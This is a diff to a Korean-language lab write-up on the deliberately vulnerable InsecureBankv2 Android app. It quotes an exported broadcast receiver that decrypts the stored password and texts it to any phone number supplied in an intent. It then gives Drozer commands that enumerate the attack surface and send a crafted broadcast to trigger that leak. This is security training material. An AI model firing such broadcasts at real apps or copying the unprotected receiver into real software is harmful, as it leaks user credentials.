@@ -67,7 +67,69 @@ public class MyReceiver extends BroadcastReceiver {
 이후 Android Device가 부팅될 때마다 브로드캐스트 리시버인 MyBrocastReciver가 이를 가로채고 onRecive() 내부에 구현된 로직이 실행되게 된다.
 
 
+```java
+public class MyBroadCastReceiver extends BroadcastReceiver {
+	String usernameBase64ByteString;
+	public static final String MYPREFS = "mySharedPreferences";
 
+	@Override
+	public void onReceive(Context context, Intent intent) {
+		// TODO Auto-generated method stub
+
+        String phn = intent.getStringExtra("phonenumber");
+        String newpass = intent.getStringExtra("newpass");
+
+		if (phn != null) {
+			try {
+                SharedPreferences settings = context.getSharedPreferences(MYPREFS, Context.MODE_WORLD_READABLE);
+                final String username = settings.getString("EncryptedUsername", null);
+                byte[] usernameBase64Byte = Base64.decode(username, Base64.DEFAULT);
+                usernameBase64ByteString = new String(usernameBase64Byte, "UTF-8");
+                final String password = settings.getString("superSecurePassword", null);
+                CryptoClass crypt = new CryptoClass();
+                String decryptedPassword = crypt.aesDeccryptedString(password);
+                String textPhoneno = phn.toString();
+                String textMessage = "Updated Password from: "+decryptedPassword+" to: "+newpass;
+                SmsManager smsManager = SmsManager.getDefault();
+                System.out.println("For the changepassword - phonenumber: "+textPhoneno+" password is: "+textMessage);
+                smsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);
+			} catch (Exception e) {
+				e.printStackTrace();
+			}
+		}
+        else {
+            System.out.println("Phone number is null");
+        }
+	}
+
+}
+```
+
+MyBroadCastReceiver 코드를 보게되면, BroadcastReceiver 객체를 상속받고, phn과 newpass를 인자로받으며, 브로드캐스트가 발생하면 onReceive() 메서드가 실행되게 된다. 해당 메서드를 보게되면, 암호화된 사용자 이름과 패스워드를 가져와서 복호화하여 SMS에 포함될 메시지로 사용하며, 사용자 전화번호로 보내도록 되어있다. 이 때 전화번호가 입력되지 않는 다면 "Phone number is null"을 출력하게 된다.
+<br><br>
+Drozer을 이용하여 실습을 진행해 보았다.
+
+```
+run app.package.attacksurface com.android.insecurebankv2
+```
+
+![그림 1-2](image1.png)
+- Drozer을 통해 취약점 유/무 확인이 가능하다.
+- 해당 내용으로는 content providers exported 가 1로 되어 있다. 이는 외부 어플리케이션에서 접근할 수 있는 서비스의 수를 의미하며, 외부 어플리케이션에서 해당 서비스를 시작할 수 있다. 해당 부분이 공격 표면이 된다.
+
+```
+run app.broadcast.info -a com.android.insecurebankv2 -i
+```
+
+![그림 1-3](image2.png)
+- 위 내용은 브로드캐스트 리시버 정보를 확인할 수 있다.
+- 살펴보면 com.android.insecurebankv2패키지의 MyBroadCastReceiver 라는 브로드캐스트 리시버가 포함되어 있다는 것을 알 수 있다. 앞에서 확인한 정보와 일치한다.
+- 권한 설정은 되어있지 않다.
+- 이후 새로운 브로드캐스트를 생성하여, 브로드캐스트 리시버에 정의된 액션을 수행할 수 있다.
+
+```
+run app.broadcast.send --action theBroadcast --extra string phonenumber 1234 --extra string newpass crack
+```
 
 
 
